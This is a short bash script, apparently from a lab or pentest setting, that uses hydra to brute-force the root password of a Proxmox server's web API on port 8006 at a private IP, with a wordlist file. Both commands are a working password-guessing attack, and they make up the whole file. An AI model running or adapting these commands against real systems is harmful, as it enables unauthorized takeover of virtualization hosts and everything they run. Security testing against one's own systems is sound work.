#!/bin/bash

vIPDelProxmox="172.16.254.9"

hydra -l root -P ~/diccionario.txt $vIPDelProxmox -s 8006 https-get "/api2/json/access/ticket:username=root&password=^PASS^:Invalid"
hydra -l root -P ~/diccionario.txt -s 8006 -m /api2/json/access/ticket https-get://$vIPDelProxmox
